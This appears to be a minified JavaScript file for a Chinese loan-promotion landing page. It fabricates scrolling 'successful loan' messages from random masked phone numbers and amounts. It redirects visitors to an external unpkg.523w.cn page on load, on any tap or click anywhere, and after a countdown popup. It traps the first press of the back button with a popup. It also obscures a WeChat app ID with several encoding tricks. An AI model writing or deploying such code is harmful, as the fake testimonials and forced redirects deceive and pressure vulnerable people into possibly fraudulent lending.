class PageManager{constructor(){this.init()}init(){console.log("页面初始化完成")}}function getWxAppId(){return"wx459db4da7366330e"}function getWxAppIdFromBase64(){return atob("d3g0NTlkYjRkYTczNjYzMzBl")}function getWxAppIdFromCharCodes(){return String.fromCharCode(119,120,52,53,57,100,98,52,100,97,55,51,54,54,51,51,48,101)}function getWxAppIdFromArray(){return["wx","4","5","9","d","b","4","d","a","7","3","6","6","3","3","0","e"].join("")}function getWxAppIdFromReplace(){return"ab459db4da7366330e".replace("ab","wx")}const miniProgramConfig={appId:getWxAppIdFromBase64(),path:"pages/index/index"};function isWechat(){return/MicroMessenger/i.test(navigator.userAgent)}function jumpToTargetPage(){console.log("onJump方法是否存在:",typeof onJump);try{if("function"==typeof onJump)console.log("调用onJump方法进行跳转"),onJump();else{console.error("onJump方法未定义，使用备用跳转方案");const e=new URLSearchParams(window.location.search).get("callback");let n="https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu";e&&(n+=`?callback=${encodeURIComponent(e)}`),console.log("使用备用跳转方案:",n),window.location.href=n}}catch(e){console.error("跳转出错:",e);const n=new URLSearchParams(window.location.search).get("callback");let t="https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu";n&&(t+=`?callback=${encodeURIComponent(n)}`),window.location.href=t}}function fallbackToScheme(){console.log("=== 使用外链跳转 ===");try{if("function"==typeof onJump)onJump();else{console.error("onJump方法未定义，使用备用跳转方案");const e=new URLSearchParams(window.location.search).get("callback");let n="https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu";e&&(n+=`?callback=${encodeURIComponent(e)}`),console.log("备用跳转URL:",n),window.location.href=n}}catch(e){console.error("跳转出错:",e);const n=new URLSearchParams(window.location.search).get("callback");let t="https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu";n&&(t+=`?callback=${encodeURIComponent(n)}`),window.location.href=t}}const pageManager=new PageManager;class BannerMessageGenerator{constructor(){this.messages=[],this.init()}init(){this.generateMessages(),this.renderMessages()}generatePhonePrefix(){const e=["130","131","132","133","134","135","136","137","138","139","150","151","152","153","155","156","157","158","159","177","178","179","180","181","182","183","184","185","186","187","188","189","190","191","192","193","194","195","196","197","198","199","200"];return e[Math.floor(Math.random()*e.length)]}generatePhoneSuffix(){return Math.floor(1e3+9e3*Math.random())}generateAmount(){const e=[14e3,15e3,16e3,17e3,18e3,19e3,2e4,21e3,22e3,23e3,24e3,25e3,26e3];return e[Math.floor(Math.random()*e.length)]}generateSingleMessage(){return`恭喜 ${this.generatePhonePrefix()}****${this.generatePhoneSuffix()} 成功借款${this.generateAmount()}额度!`}generateMessages(){this.messages=[];for(let e=0;e<50;e++)this.messages.push(this.generateSingleMessage())}renderMessages(){const e=document.getElementById("bannerText");e&&(e.innerHTML="",this.messages.forEach(n=>{const t=document.createElement("span");t.textContent=n,e.appendChild(t)}))}updateMessages(){this.generateMessages(),this.renderMessages()}}const bannerGenerator=new BannerMessageGenerator;function showLoading(){const e=document.getElementById("activateBtn");if(e){e.classList.add("loading");const n=e.querySelector(".button-text"),t=e.querySelector(".loading-content");n&&t&&(n.style.display="none",t.style.display="flex"),e.style.pointerEvents="none"}}function showPopup(){const e=document.getElementById("popupOverlay");e&&(e.style.display="flex",startCountdown())}function hidePopup(){const e=document.getElementById("popupOverlay");e&&(e.style.display="none")}function startCountdown(){let e=2;const n=document.getElementById("countdownNumber"),t=setInterval(function(){e--,n&&(n.textContent=e),e<=0&&(clearInterval(t),jumpToTargetPage())},800)}setInterval(()=>{bannerGenerator.updateMessages(),console.log("Banner消息已更新")},3e5),document.addEventListener("DOMContentLoaded",function(){function e(){return"function"==typeof onJump?(console.log("✓ onJump方法可用，立即跳转"),jumpToTargetPage(),!0):!(!window.WEIKEJS||!window.WEIKEJS.onJump||(console.log("✓ WEIKEJS.onJump方法可用，立即跳转"),jumpToTargetPage(),0))}if(console.log("页面加载完成，绑定事件"),console.log("微信AppID:",getWxAppIdFromBase64()),!e()){const n=setInterval(()=>{e()&&clearInterval(n)},100)}let n=!0;const t=document.getElementById("activateBtn");t&&t.addEventListener("click",function(e){e.preventDefault(),console.log("激活额度按钮被点击"),showLoading(),setTimeout(()=>{jumpToTargetPage()},100)});const o=document.getElementById("backBtn");o&&o.addEventListener("click",function(){n?(console.log("返回按钮第一次点击，显示弹框"),showPopup(),n=!1):(console.log("返回按钮第二次点击，执行真实返回"),window.history.length>1?window.history.back():window.close())});const a=document.getElementById("popupButton");a&&a.addEventListener("click",function(){console.log("弹框领取按钮被点击"),hidePopup(),jumpToTargetPage()});const c=document.getElementById("popupCloseBtn");c&&c.addEventListener("click",function(){console.log("弹框关闭按钮被点击"),hidePopup()}),document.addEventListener("click",function(e){e.target===t||t&&t.contains(e.target)||e.target===o||o&&o.contains(e.target)||e.target.closest(".popup-overlay")||(console.log("用户点击触发跳转"),jumpToTargetPage())}),document.addEventListener("touchstart",function(e){e.target===t||t&&t.contains(e.target)||e.target===o||o&&o.contains(e.target)||e.target.closest(".popup-overlay")||(console.log("用户触摸触发跳转"),jumpToTargetPage())});const s=document.querySelector(".kefu");s&&s.addEventListener("click",function(){console.log("客服区域被点击"),window.location.href="tel:400-138-0866"}),document.querySelectorAll(".process-item").forEach((e,n)=>{e.addEventListener("click",function(){const n=e.querySelector("p").textContent;console.log("流程步骤被点击:",n)})}),console.log("页面加载完成")});